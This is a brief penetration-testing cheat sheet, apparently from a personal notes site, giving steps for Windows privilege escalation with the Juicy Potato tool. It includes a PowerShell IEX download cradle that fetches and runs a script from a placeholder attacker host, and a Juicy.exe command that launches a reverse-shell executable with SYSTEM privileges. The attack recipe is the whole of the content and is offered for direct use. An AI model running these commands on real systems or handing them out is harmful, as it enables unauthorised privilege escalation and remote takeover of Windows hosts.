---
description: Potato is yummy
---

# Juicy Potato

1. Enumerate either the`SeImpersonate` or `SeAssignPrimaryToken` privileges
2. Begin by uploading the [Juicy Potato binary](https://github.com/ohpe/juicy-potato) to the system.
3. Additionally, run the following command to enumerate valid CLSID's for use with JuicyPotato `IEX (New-Object Net.WebClient).DownloadString('http://[IP]/GetCLSID.ps1')`
4. After enumerating a valid CLSID we can run the following command: `.\Juicy.exe -t t -p C:\Windows\Tasks\reverse.exe -l 5837 -c {bb6df56b-cace-11dc-9992-0019b93a3a84}`
